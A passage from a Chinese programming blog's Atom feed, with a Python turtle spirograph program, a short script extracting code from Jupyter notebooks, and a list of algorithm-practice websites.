class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#importing the required libraries </span></span><br><span class="line"><span class="hljs-keyword">import</span> random, argparse </span><br><span class="line"><span class="hljs-keyword">import</span> math </span><br><span class="line"><span class="hljs-keyword">import</span> turtle </span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image </span><br><span class="line"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime </span><br><span class="line"><span class="hljs-keyword">from</span> fractions <span class="hljs-keyword">import</span> gcd </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># A class that draws a spirograph </span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Spiro</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># constructor </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, xc, yc, col, R, r, l)</span>:</span> </span><br><span class="line">  </span><br><span class="line">        <span class="hljs-comment"># create own turtle </span></span><br><span class="line">        self.t = turtle.Turtle() </span><br><span class="line">        <span class="hljs-comment"># set cursor shape </span></span><br><span class="line">        self.t.shape(<span class="hljs-string">'turtle'</span>) </span><br><span class="line">        <span class="hljs-comment"># set step in degrees </span></span><br><span class="line">        self.step = <span class="hljs-number">5</span></span><br><span class="line">        <span class="hljs-comment"># set drawing complete flag </span></span><br><span class="line">        self.drawingComplete = <span class="hljs-literal">False</span></span><br><span class="line">  </span><br><span class="line">        <span class="hljs-comment"># set parameters </span></span><br><span class="line">        self.setparams(xc, yc, col, R, r, l) </span><br><span class="line">  </span><br><span class="line">        <span class="hljs-comment"># initiatize drawing </span></span><br><span class="line">        self.restart() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set parameters </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setparams</span><span class="hljs-params">(self, xc, yc, col, R, r, l)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># spirograph parameters </span></span><br><span class="line">        self.xc = xc </span><br><span class="line">        self.yc = yc </span><br><span class="line">        self.R = int(R) </span><br><span class="line">        self.r = int(r) </span><br><span class="line">        self.l = l </span><br><span class="line">        self.col = col </span><br><span class="line">        <span class="hljs-comment"># reduce r/R to smallest form by dividing with GCD </span></span><br><span class="line">        gcdVal = gcd(self.r, self.R) </span><br><span class="line">        self.nRot = self.r//gcdVal </span><br><span class="line">        <span class="hljs-comment"># get ratio of radii </span></span><br><span class="line">        self.k = r/float(R) </span><br><span class="line">        <span class="hljs-comment"># set color </span></span><br><span class="line">        self.t.color(*col) </span><br><span class="line">        <span class="hljs-comment"># current angle </span></span><br><span class="line">        self.a = <span class="hljs-number">0</span></span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># restart drawing </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restart</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># set flag </span></span><br><span class="line">        self.drawingComplete = <span class="hljs-literal">False</span></span><br><span class="line">        <span class="hljs-comment"># show turtle </span></span><br><span class="line">        self.t.showturtle() </span><br><span class="line">        <span class="hljs-comment"># go to first point </span></span><br><span class="line">        self.t.up() </span><br><span class="line">        R, k, l = self.R, self.k, self.l </span><br><span class="line">        a = <span class="hljs-number">0.0</span></span><br><span class="line">        x = R*((<span class="hljs-number">1</span>-k)*math.cos(a) + l*k*math.cos((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        y = R*((<span class="hljs-number">1</span>-k)*math.sin(a) - l*k*math.sin((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        self.t.setpos(self.xc + x, self.yc + y) </span><br><span class="line">        self.t.down() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># draw the whole thing </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">draw</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># draw rest of points </span></span><br><span class="line">        R, k, l = self.R, self.k, self.l </span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">360</span>*self.nRot + <span class="hljs-number">1</span>, self.step): </span><br><span class="line">            a = math.radians(i) </span><br><span class="line">            x = R*((<span class="hljs-number">1</span>-k)*math.cos(a) + l*k*math.cos((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">            y = R*((<span class="hljs-number">1</span>-k)*math.sin(a) - l*k*math.sin((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">            self.t.setpos(self.xc + x, self.yc + y) </span><br><span class="line">        <span class="hljs-comment"># done - hide turtle </span></span><br><span class="line">        self.t.hideturtle() </span><br><span class="line">      </span><br><span class="line">    <span class="hljs-comment"># update by one step </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># skip if done </span></span><br><span class="line">        <span class="hljs-keyword">if</span> self.drawingComplete: </span><br><span class="line">            <span class="hljs-keyword">return</span></span><br><span class="line">        <span class="hljs-comment"># increment angle </span></span><br><span class="line">        self.a += self.step </span><br><span class="line">        <span class="hljs-comment"># draw step </span></span><br><span class="line">        R, k, l = self.R, self.k, self.l </span><br><span class="line">        <span class="hljs-comment"># set angle </span></span><br><span class="line">        a = math.radians(self.a) </span><br><span class="line">        x = self.R*((<span class="hljs-number">1</span>-k)*math.cos(a) + l*k*math.cos((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        y = self.R*((<span class="hljs-number">1</span>-k)*math.sin(a) - l*k*math.sin((<span class="hljs-number">1</span>-k)*a/k)) </span><br><span class="line">        self.t.setpos(self.xc + x, self.yc + y) </span><br><span class="line">        <span class="hljs-comment"># check if drawing is complete and set flag </span></span><br><span class="line">        <span class="hljs-keyword">if</span> self.a &gt;= <span class="hljs-number">360</span>*self.nRot: </span><br><span class="line">            self.drawingComplete = <span class="hljs-literal">True</span></span><br><span class="line">            <span class="hljs-comment"># done - hide turtle </span></span><br><span class="line">            self.t.hideturtle() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># clear everything </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        self.t.clear() </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># A class for animating spirographs </span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpiroAnimator</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># constructor </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, N)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># timer value in milliseconds </span></span><br><span class="line">        self.deltaT = <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-comment"># get window dimensions </span></span><br><span class="line">        self.width = turtle.window_width() </span><br><span class="line">        self.height = turtle.window_height() </span><br><span class="line">        <span class="hljs-comment"># create spiro objects </span></span><br><span class="line">        self.spiros = [] </span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(N): </span><br><span class="line">            <span class="hljs-comment"># generate random parameters </span></span><br><span class="line">            rparams = self.genRandomParams() </span><br><span class="line">            <span class="hljs-comment"># set spiro params </span></span><br><span class="line">            spiro = Spiro(*rparams) </span><br><span class="line">            self.spiros.append(spiro) </span><br><span class="line">        <span class="hljs-comment"># call timer </span></span><br><span class="line">        turtle.ontimer(self.update, self.deltaT) </span><br><span class="line">      </span><br><span class="line">    <span class="hljs-comment"># restart sprio drawing </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restart</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-keyword">for</span> spiro <span class="hljs-keyword">in</span> self.spiros: </span><br><span class="line">            <span class="hljs-comment"># clear </span></span><br><span class="line">            spiro.clear() </span><br><span class="line">            <span class="hljs-comment"># generate random parameters </span></span><br><span class="line">            rparams = self.genRandomParams() </span><br><span class="line">            <span class="hljs-comment"># set spiro params </span></span><br><span class="line">            spiro.setparams(*rparams) </span><br><span class="line">            <span class="hljs-comment"># restart drawing </span></span><br><span class="line">            spiro.restart() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># generate random parameters </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genRandomParams</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        width, height = self.width, self.height </span><br><span class="line">        R = random.randint(<span class="hljs-number">50</span>, min(width, height)//<span class="hljs-number">2</span>) </span><br><span class="line">        r = random.randint(<span class="hljs-number">10</span>, <span class="hljs-number">9</span>*R//<span class="hljs-number">10</span>) </span><br><span class="line">        l = random.uniform(<span class="hljs-number">0.1</span>, <span class="hljs-number">0.9</span>) </span><br><span class="line">        xc = random.randint(-width//<span class="hljs-number">2</span>, width//<span class="hljs-number">2</span>) </span><br><span class="line">        yc = random.randint(-height//<span class="hljs-number">2</span>, height//<span class="hljs-number">2</span>) </span><br><span class="line">        col = (random.random(), </span><br><span class="line">               random.random(), </span><br><span class="line">               random.random()) </span><br><span class="line">        <span class="hljs-keyword">return</span> (xc, yc, col, R, r, l) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-comment"># update all spiros </span></span><br><span class="line">        nComplete = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> spiro <span class="hljs-keyword">in</span> self.spiros: </span><br><span class="line">            <span class="hljs-comment"># update </span></span><br><span class="line">            spiro.update() </span><br><span class="line">            <span class="hljs-comment"># count completed ones </span></span><br><span class="line">            <span class="hljs-keyword">if</span> spiro.drawingComplete: </span><br><span class="line">                nComplete+= <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-comment"># if all spiros are complete, restart </span></span><br><span class="line">        <span class="hljs-keyword">if</span> nComplete == len(self.spiros): </span><br><span class="line">            self.restart() </span><br><span class="line">        <span class="hljs-comment"># call timer </span></span><br><span class="line">        turtle.ontimer(self.update, self.deltaT) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># toggle turtle on/off </span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">toggleTurtles</span><span class="hljs-params">(self)</span>:</span> </span><br><span class="line">        <span class="hljs-keyword">for</span> spiro <span class="hljs-keyword">in</span> self.spiros: </span><br><span class="line">            <span class="hljs-keyword">if</span> spiro.t.isvisible(): </span><br><span class="line">                spiro.t.hideturtle() </span><br><span class="line">            <span class="hljs-keyword">else</span>: </span><br><span class="line">                spiro.t.showturtle() </span><br><span class="line">              </span><br><span class="line"><span class="hljs-comment"># save spiros to image </span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">saveDrawing</span><span class="hljs-params">()</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># hide turtle </span></span><br><span class="line">    turtle.hideturtle() </span><br><span class="line">    <span class="hljs-comment"># generate unique file name </span></span><br><span class="line">    dateStr = (datetime.now()).strftime(<span class="hljs-string">"%d%b%Y-%H%M%S"</span>) </span><br><span class="line">    fileName = <span class="hljs-string">'spiro-'</span> + dateStr </span><br><span class="line">    print(<span class="hljs-string">'saving drawing to %s.eps/png'</span> % fileName) </span><br><span class="line">    <span class="hljs-comment"># get tkinter canvas </span></span><br><span class="line">    canvas = turtle.getcanvas() </span><br><span class="line">    <span class="hljs-comment"># save postscipt image </span></span><br><span class="line">    canvas.postscript(file = fileName + <span class="hljs-string">'.eps'</span>) </span><br><span class="line">    <span class="hljs-comment"># use PIL to convert to PNG </span></span><br><span class="line">    img = Image.open(fileName + <span class="hljs-string">'.eps'</span>) </span><br><span class="line">    img.save(fileName + <span class="hljs-string">'.png'</span>, <span class="hljs-string">'png'</span>) </span><br><span class="line">    <span class="hljs-comment"># show turtle </span></span><br><span class="line">    turtle.showturtle() </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># main() function </span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span> </span><br><span class="line">    <span class="hljs-comment"># use sys.argv if needed </span></span><br><span class="line">    print(<span class="hljs-string">'generating spirograph...'</span>) </span><br><span class="line">    <span class="hljs-comment"># create parser </span></span><br><span class="line">    descStr = <span class="hljs-string">"""This program draws spirographs using the Turtle module. </span></span><br><span class="line"><span class="hljs-string">    When run with no arguments, this program draws random spirographs. </span></span><br><span class="line"><span class="hljs-string">      </span></span><br><span class="line"><span class="hljs-string">    Terminology: </span></span><br><span class="line"><span class="hljs-string">  </span></span><br><span class="line"><span class="hljs-string">    R: radius of outer circle. </span></span><br><span class="line"><span class="hljs-string">    r: radius of inner circle. </span></span><br><span class="line"><span class="hljs-string">    l: ratio of hole distance to r. </span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=descStr) </span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># add expected arguments </span></span><br><span class="line">    parser.add_argument(<span class="hljs-string">'--sparams'</span>, nargs=<span class="hljs-number">3</span>, dest=<span class="hljs-string">'sparams'</span>, required=<span class="hljs-literal">False</span>, </span><br><span class="line">                        help=<span class="hljs-string">"The three arguments in sparams: R, r, l."</span>) </span><br><span class="line">                          </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># parse args </span></span><br><span class="line">    args = parser.parse_args() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set to 80% screen width </span></span><br><span class="line">    turtle.setup(width=<span class="hljs-number">0.8</span>) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set cursor shape </span></span><br><span class="line">    turtle.shape(<span class="hljs-string">'turtle'</span>) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># set title </span></span><br><span class="line">    turtle.title(<span class="hljs-string">"Spirographs!"</span>) </span><br><span class="line">    <span class="hljs-comment"># add key handler for saving images </span></span><br><span class="line">    turtle.onkey(saveDrawing, <span class="hljs-string">"s"</span>) </span><br><span class="line">    <span class="hljs-comment"># start listening </span></span><br><span class="line">    turtle.listen() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># hide main turtle cursor </span></span><br><span class="line">    turtle.hideturtle() </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># checks args and draw </span></span><br><span class="line">    <span class="hljs-keyword">if</span> args.sparams: </span><br><span class="line">        params = [float(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> args.sparams] </span><br><span class="line">        <span class="hljs-comment"># draw spirograph with given parameters </span></span><br><span class="line">        <span class="hljs-comment"># black by default </span></span><br><span class="line">        col = (<span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>) </span><br><span class="line">        spiro = Spiro(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, col, *params) </span><br><span class="line">        spiro.draw() </span><br><span class="line">    <span class="hljs-keyword">else</span>: </span><br><span class="line">        <span class="hljs-comment"># create animator object </span></span><br><span class="line">        spiroAnim = SpiroAnimator(<span class="hljs-number">4</span>) </span><br><span class="line">        <span class="hljs-comment"># add key handler to toggle turtle cursor </span></span><br><span class="line">        turtle.onkey(spiroAnim.toggleTurtles, <span class="hljs-string">"t"</span>) </span><br><span class="line">        <span class="hljs-comment"># add key handler to restart animation </span></span><br><span class="line">        turtle.onkey(spiroAnim.restart, <span class="hljs-string">"space"</span>) </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-comment"># start turtle main loop </span></span><br><span class="line">    turtle.mainloop() </span><br><span class="line">  </span><br><span class="line"><span class="hljs-comment"># call main </span></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>: </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>实现效果：</p><img src="https://s2.ax1x.com/2019/11/09/MeyR1S.png" alt="MeyR1S.png" border="0">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;旋转描记器是一种几何绘图玩具，可产生各种技术上称为下摆线和下摆线的数学轮盘曲线。它是由英国工程师Denys Fisher开发的，于1965年首次出售。该名称是1998年Hasbro 公司（Hasbro Inc.）的注册商标，此前该公司 收购了Denys Fisher公司。Spirograph品牌于2013年由Kahootz Toys在全球范围内重新推出其原始产品配置，旋描仪可用于绘制各种分形。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="旋转描记器" scheme="http://yoursite.com/tags/%E6%97%8B%E8%BD%AC%E6%8F%8F%E8%AE%B0%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>提取ipynb文件中的py代码</title>
    <link href="http://yoursite.com/2019/11/08/%E6%8F%90%E5%8F%96ipynb%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84py%E4%BB%A3%E7%A0%81/"/>
    <id>http://yoursite.com/2019/11/08/提取ipynb文件中的py代码/</id>
    <published>2019-11-08T13:07:53.000Z</published>
    <updated>2019-11-08T13:13:44.882Z</updated>
    
    <content type="html"><![CDATA[<p>.ipynb是Anaconda3中Jupyter Notebook的文件格式，非常方便Python教学，在科学计算和数据分析等领域使用较多。在Jupyter Notebook中，使用菜单File==&gt;Download as==&gt;Python(.py)可以直接另存为.py文件，但是如果已经存在.ipynb文件该怎么去获得python代码呢？</p><a id="more"></a><p>当我们利用记事本打开.ipynb文件时，会发现文件的格式跟json文件是一样的。这样的话可以使用Python标准库json进行解析，然后提取其中的Python代码。</p><p>参考代码：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> open(<span class="hljs-string">"你的文件名称.ipynb"</span>,encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> fp:</span><br><span class="line">    content = json.load(fp)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> open(<span class="hljs-string">"保存的文件名称.py"</span>,<span class="hljs-string">"w"</span>,encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> fp:</span><br><span class="line">    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content[<span class="hljs-string">"cells"</span>]:</span><br><span class="line">        fp.writelines([i.rstrip()+<span class="hljs-string">"\n"</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> item[<span class="hljs-string">"source"</span>]])</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;.ipynb是Anaconda3中Jupyter Notebook的文件格式，非常方便Python教学，在科学计算和数据分析等领域使用较多。在Jupyter Notebook中，使用菜单File==&amp;gt;Download as==&amp;gt;Python(.py)可以直接另存为.py文件，但是如果已经存在.ipynb文件该怎么去获得python代码呢？&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="提取ipynb文件" scheme="http://yoursite.com/tags/%E6%8F%90%E5%8F%96ipynb%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>算法刷题网站</title>
    <link href="http://yoursite.com/2019/11/08/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/"/>
    <id>http://yoursite.com/2019/11/08/算法刷题网站/</id>
    <published>2019-11-08T12:42:15.000Z</published>
    <updated>2019-11-08T12:58:32.343Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直想刷题，经过苦苦寻找，找到了以下几个较好的平台，然后记录在这里吧。</p><a id="more"></a><h1 id="一、收割offer版"><a href="#一、收割offer版" class="headerlink" title="一、收割offer版"></a>一、收割offer版</h1><h2 id="1-力扣"><a href="#1-力扣" class="headerlink" title="1.力扣"></a>1.力扣</h2><p>英文网址：<a href="https://leetcode.com/" target="_blank" rel="noopener">https://leetcode.com/</a></p><p>中文网址：<a href="https://leetcode-cn.com/" target="_blank" rel="noopener">https://leetcode-cn.com/</a></p><p>估计 leetcode（力扣）大家都很熟悉了，都被推荐烂了，很多国内外的程序员在上面刷题，难度从 Easy、Medium 至 Hard 都有，据说很多面试官都会从中挑选各种题目，号称大厂的筛码工。</p><h2 id="2-hihoCoder"><a href="#2-hihoCoder" class="headerlink" title="2.hihoCoder"></a>2.hihoCoder</h2><p>网址：<a href="https://hihocoder.com" target="_blank" rel="noopener">https://hihocoder.com</a></p><p>网站的技术团队来自于原北大 POJ 的开发团队，至于 POJ 会在后面的篇章中介绍，反正膜拜就完事了。一些知名的大厂比如微软、百度、腾讯、网易等会在上面举办在线编程比赛，风格倒是和 ACM 比赛类似。</p><h2 id="3-牛客网"><a href="#3-牛客网" class="headerlink" title="3.牛客网"></a>3.牛客网</h2><p>网址：<a href="https://www.nowcoder.com/" target="_blank" rel="noopener">https://www.nowcoder.com/</a></p><p>牛客网作为国内内容超级丰富的 IT 题库，各种东西看的我眼花缭乱，题库+面试+学习+求职+讨论 360 度无死角服务，堪称”互联网求职神器”。它好就好在不只是一个刷题的平台，还是一个交流学习的平台，发个问题贴总有热心的大佬帮助。</p><h2 id="计蒜客"><a href="#计蒜客" class="headerlink" title="计蒜客"></a>计蒜客</h2><p>网址：<a href="https://www.jisuanke.com/" target="_blank" rel="noopener">https://www.jisuanke.com/</a></p><p>计蒜客这个网站可能很多人不知道，它也有可以刷题的题库，也会定期举办比赛。</p><h1 id="二、ACM-竞赛版"><a href="#二、ACM-竞赛版" class="headerlink" title="二、ACM 竞赛版"></a>二、ACM 竞赛版</h1><h2 id="1-HDU"><a href="#1-HDU" class="headerlink" title="1.HDU"></a>1.HDU</h2><p>网址：<a href="http://acm.hdu.edu.cn/" target="_blank" rel="noopener">http://acm.hdu.edu.cn/</a></p><p>杭电（杭州电子科技大学）的 OJ 大概是国内最火的几个 OJ 之一了，大多数 ACMer 应该都知道（其实我想说所有来着），勿需多说，非常多比赛都在上面，比如每年暑假的多校联赛，朝鲜、外蒙等学校的队伍都会参加，想不知道都不可能。</p><h2 id="2-POJ"><a href="#2-POJ" class="headerlink" title="2.POJ"></a>2.POJ</h2><p>网址：<a href="http://poj.org/" target="_blank" rel="noopener">http://poj.org/</a></p><p>POJ（Peking University Online Judge）,同样作为国内最火的几大 OJ 之一，它的建立时间更早，一些上古时期的题目也能在上面找到，同样 POJ 也很出名。</p><h2 id="3-SDUT"><a href="#3-SDUT" class="headerlink" title="3.SDUT"></a>3.SDUT</h2><p>网址：<a href="https://acm.sdut.edu.cn/" target="_blank" rel="noopener">https://acm.sdut.edu.cn/</a></p><h2 id="4-其它-OJ"><a href="#4-其它-OJ" class="headerlink" title="4.其它 OJ"></a>4.其它 OJ</h2><p>最后附带一些其它同样优秀的 OJ 平台：</p><p><strong>国内：</strong></p><p>ZJU（浙大）: <a href="https://zoj.pintia.cn/home" target="_blank" rel="noopener">https://zoj.pintia.cn/home</a></p><p>USTC（中科大）：<a href="http://acm.ustc.edu.cn/ustcoj/" target="_blank" rel="noopener">http://acm.ustc.edu.cn/ustcoj/</a></p><p>FZU（福大）：<a href="http://acm.fzu.edu.cn/" target="_blank" rel="noopener">http://acm.fzu.edu.cn/</a></p><p>HIT（哈工大）：<a href="http://acm.hit.edu.cn/" target="_blank" rel="noopener">http://acm.hit.edu.cn/</a></p><p><strong>国外：</strong></p><p>URAL：<a href="http://acm.timus.ru/" target="_blank" rel="noopener">http://acm.timus.ru/</a></p><p>SPOJ：<a href="https://www.spoj.com/" target="_blank" rel="noopener">https://www.spoj.com/</a></p><h1 id="三、提高版"><a href="#三、提高版" class="headerlink" title="三、提高版"></a>三、提高版</h1><h2 id="1-Codeforces"><a href="#1-Codeforces" class="headerlink" title="1.Codeforces"></a>1.Codeforces</h2><p>网址：<a href="https://codeforces.com/" target="_blank" rel="noopener">https://codeforces.com/</a></p><p>Codeforces 又被戏称为 CF，是一家俄罗斯的网站，当然还是用英文食用。这里的很好的比赛，很好的题目，很好的选手，简称”三好”。</p><h2 id="2-Topcoder"><a href="#2-Topcoder" class="headerlink" title="2.Topcoder"></a>2.Topcoder</h2><p>网址：<a href="https://www.topcoder.com/" target="_blank" rel="noopener">https://www.topcoder.com/</a></p><p>Topcoder 据说是世界上规模最大的编程网站，如果这样的话那这个 Top 就可以理解了，Top 的 coder。</p><h1 id="四、写在最后"><a href="#四、写在最后" class="headerlink" title="四、写在最后"></a>四、写在最后</h1><p><strong>刷题不要单纯的为了追求做题的数量，还是要以学会为目的，并且学以致用。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一直想刷题，经过苦苦寻找，找到了以下几个较好的平台，然后记录在这里吧。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="算法刷题" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>对自己的python代码加密</title>
    <link href="http://yoursite.com/2019/11/05/%E5%AF%B9%E8%87%AA%E5%B7%B1%E7%9A%84python%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86/"/>
    <id>http://yoursite.com/2019/11/05/对自己的python代码加密/</id>
    <published>2019-11-05T14:04:28.000Z</published>
    <updated>2019-11-08T13:14:18.472Z</updated>
    
